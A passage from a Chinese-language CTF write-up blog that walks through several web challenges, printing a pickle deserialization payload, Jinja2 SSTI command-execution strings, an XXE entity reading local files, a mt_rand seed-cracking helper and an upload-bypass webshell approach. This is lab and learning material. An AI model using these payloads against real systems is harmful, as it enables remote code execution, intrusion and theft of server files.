class="string">&#x27;在&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412224342396.png" alt="image-20230412224342396"></p><p>最后发现是在第180页</p><p><img src="../images/image-20230412224420291.png" alt="image-20230412224420291"></p><p>发现钱不够，于是抓包查看一下，看能不能修改金额</p><p><img src="../images/image-20230412225112765.png" alt="image-20230412225112765"></p><p><img src="../images/image-20230412225054064.png" alt="image-20230412225054064"></p><p>修改折扣之后，购买成功，然后返回一个地址</p><p><img src="../images/image-20230412225211663.png" alt="image-20230412225211663"></p><p>发现只给admin用户访问，抓包的时候我们发现存在<code>JWT</code>,那么我们猜测是修改这个<code>JWT</code></p><p>第一次无密码加密的时候发现不能成功，那么就猜测这是需要<strong>密钥</strong>来进行加密的</p><p>于是我们就尝试使用爆破工具</p><p><img src="../images/image-20230412225853104.png" alt="image-20230412225853104"></p><p>爆破出密钥</p><p>哪么就去<code>jwt.io</code>尝试进行修改值</p><p><img src="../images/image-20230412230001862.png" alt="image-20230412230001862"></p><p><img src="../images/image-20230412230025452.png" alt="image-20230412230025452"></p><p>登录成功</p><p><img src="../images/image-20230412230134260.png" alt="image-20230412230134260"></p><p>查看源码  发现存在源码泄露</p><p>最后发现在<code>Admin.py</code>文件里发现漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AdminHandler</span>(<span class="title class_ inherited__">BaseHandler</span>):</span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>考察点就是python反序列化   <strong>pickle  和   loads</strong>   两关键词</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">payload</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (commands.getoutput,(<span class="string">&#x27;ls /&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a = payload()</span><br><span class="line"><span class="built_in">print</span> urllib.quote(pickle.dumps(a))</span><br></pre></td></tr></table></figure><p><strong>这是使用R操作码进行操作的   然后被禁了  还可以使用其他操作码进行绕过</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c__builtin__%0Aeval%0Ap0%0A%28S%22<span class="built_in">open</span>%<span class="number">28</span>%<span class="number">27</span>/flag.txt%<span class="number">27</span>%2C%27r%<span class="number">27</span>%<span class="number">29.</span>read%<span class="number">28</span>%<span class="number">29</span>%<span class="number">22</span>%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412231137498.png" alt="image-20230412231137498"></p><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>题目</p><p><img src="../images/image-20230413194516104.png" alt="image-20230413194516104"></p><p>给了提示</p><p><img src="../images/image-20230413194554347.png" alt="image-20230413194554347"></p><p>发现是jinjia2框架的ssti</p><p><img src="../images/image-20230413194801325.png" alt="image-20230413194801325"></p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?search=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">258</span>](<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">258</span>](<span class="string">&#x27;ls /flasklight&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br><span class="line"></span><br><span class="line">?search=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">258</span>](<span class="string">&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br></pre></td></tr></table></figure><p>这里的话我都是直接拿存着的模板去打，当然也可以按照步骤一步一步来打</p><h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>题目</p><p>查看源码发现了<code>check.php</code>，然后访问得到一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>这个考点的话之前做过了，现在在重温一便</p><p>就是说只要<code>mt_srand(seed)</code>的<code>seed</code>固定，那么就可以得到随机数的值</p><p>所以说我们得使用工具来通过爆破随机数的值来爆破出种子，从而得到接下来随机数的值</p><p><strong>然后写个脚本把给的前十位字符串转化为工具能识别出来的</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">str1 =<span class="string">&#x27;rlD3S0vhc3&#x27;</span></span><br><span class="line">str2 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">result =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(str2)-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] ==  str2[j]:</span><br><span class="line">            result += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> +<span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + length + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line">// 前两个<span class="built_in">str</span>(j)代表第一个mt_rand()输出的界限，后两个参数<span class="number">0</span>和<span class="built_in">str</span>(<span class="built_in">len</span>(str1)-<span class="number">1</span>)表示传递到 mt_rand()的范围为<span class="number">0</span>到<span class="number">61</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">17 17 0 61 11 11 0 61 39 39 0 61 29 29 0 61 54 54 0 61 26 26 0 61 21 21 0 61 7 7 0 61 2 2 0 61 29 29 0 61</span><br></pre></td></tr></table></figure><p>seed爆破工具</p><p><a href="https://www.openwall.com/php_mt_seed/">php_mt_seed - PHP mt_rand() seed cracker</a></p><p><img src="../images/image-20230413202206497.png" alt="image-20230413202206497"></p><p>拿到种子</p><p><img src="../images/image-20230413202345933.png" alt="image-20230413202345933"></p><p><img src="../images/image-20230413202336046.png" alt="image-20230413202336046"></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>题目</p><p><img src="../images/image-20230413202626327.png" alt="image-20230413202626327"></p><p>这种题目有好多地方都是考点</p><p>于是就一个一个的进行尝试</p><p>最后发现这里考察的是  <strong>文件上传</strong></p><p><img src="../images/image-20230413203203320.png" alt="image-20230413203203320"></p><p>这个函数应该很熟悉了吧，就是判断文件头是否为图片类型</p><p>那我先传入一个图片马，上传成功。但是发现无论是.htaccess，还是各种格式的都无法上传成功，图片马也无法利用。</p><p>这时猜测是否能通过web应用程序解析漏洞绕过。报错网页，发现是apache</p><p><img src="../images/image-20230413204301391.png" alt="image-20230413204301391"></p><p>随便输入点东西让他报错     发现是apache的</p><p><strong>由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，jpg等扩展名是apache不能识别的</strong></p><p>这里的话可以看看这篇文章  <a href="https://www.freebuf.com/vuls/335282.html">apache中间件漏洞解析总结</a></p><p><strong>但是这里又无法上传成功，很奇怪。这里测试了一会，发现反着利用就可以了，上传1.jpg.php</strong></p><p><strong>看图片链接，发现上传路径/uploads。然后最奇特的一点，jpg好像被过滤成空了，直接是php文件了。那就直接利用。蚁剑连接，在根目录下找到flag</strong></p><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>题目</p><p><img src="../images/image-20230413205529469.png" alt="image-20230413205529469"></p><p>和之前show的题目很像，都是长这样的</p><p><img src="../images/image-20230413210616742.png" alt="image-20230413210616742"></p><p>抓包判断出这是考察的<code>XXE</code></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds [&lt;!ENTITY goodies SYSTEM &quot;file:///proc/net/arp&quot;&gt;]&gt;</span><br></pre></td></tr></table></figure><p>这里的话直接读flag是读不出来的</p><p><strong>但是XML解释器支持多种协议，其中PHP就支持http和gopher，所以可能flag存在于内网主机上，我们需要通过XXE对内网进行探测。</strong></p><ul><li>/etc/hosts 储存域名解析的缓存</li><li>/etc/passwd 用户密码</li><li>/proc/net/arp 每个网络接口的arp表中dev包</li></ul><p><strong>/proc/net/arp</strong>    可以直接查看内网ip</p><p><img src="../images/image-20230413212725585.png" alt="image-20230413212725585"></p><p>于是就开始爆破内网IP，就是扫c段，然后就可以发现flag了</p><p>匹配到正确的ip就能发现flag</p><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>题目</p><p>报错注入</p><p><a href="https://www.cnblogs.com/gaonuoqi/p/12621382.html">wp</a></p><p>这里话是话就是通过修改密码处会进行报错提示</p><h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>题目</p><p><img src="../images/image-20230415210121161.png" alt="image-20230415210121161"></p><p>给了一个登录框</p><p><strong>涉及知识点 任意文件下载、phar反序列化、open_basedir</strong></p><p><img src="../images/image-20230415210836408.png" alt="image-20230415210836408"></p><p>随便上传一点东西后，可以考虑是不是文件上传，经过尝试发现不是后，如何看这个<strong>下载</strong>，有点感觉像是<strong>文件包含</strong>，于是进行抓包</p><p><img src="../images/image-20230415211021670.png" alt="image-20230415211021670"></p><p>发现确实是文件包含</p><h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p><strong>考点</strong></p><p><strong>php伪协议</strong></p><p><strong>二次注入</strong></p><p>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</p><p><strong>查看源码发现提示</strong></p><p><img src="../images/image-20230507212434313.png" alt="image-20230507212434313"></p><p>这里进行文件的读取的话，可以考虑php伪协议进行读取</p><p><img src="../images/image-20230507212605275.png" alt="image-20230507212605275"></p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line"><span class="variable">$file</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;index&lt;/title&gt;</span><br><span class="line">&lt;base href=<span class="string">&quot;./&quot;</span>&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/custom-animations.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;h&quot;</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h2</span>&gt;2077发售了,不来份实体典藏版吗?&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">img</span> <span class="title">class</span>=&quot;<span class="title">logo</span>&quot; <span class="title">src</span>=&quot;./<span class="title">assets</span>/<span class="title">img</span>/<span class="title">logo</span>-<span class="title">en</span>.<span class="title">png</span>&quot;&gt;&lt;!--<span class="title">LOGOLOGOLOGOLOGO</span>--&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-8 <span class="title">col</span>-<span class="title">md</span>-<span class="title">offset</span>-2 <span class="title">centered</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h3</span>&gt;提交订单&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">role</span>=&quot;<span class="title">form</span>&quot; <span class="title">action</span>=&quot;./<span class="title">confirm</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">application</span>/<span class="title">x</span>-<span class="title">www</span>-<span class="title">urlencoded</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;姓名:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">user_name</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;电话:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">phone</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;地址:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">address</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span>  <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;我正是送钱之人&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">f</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;订单管理&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">search</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我要查订单&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">change</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我要修改收货地址&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">delete</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;我不想要了&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span 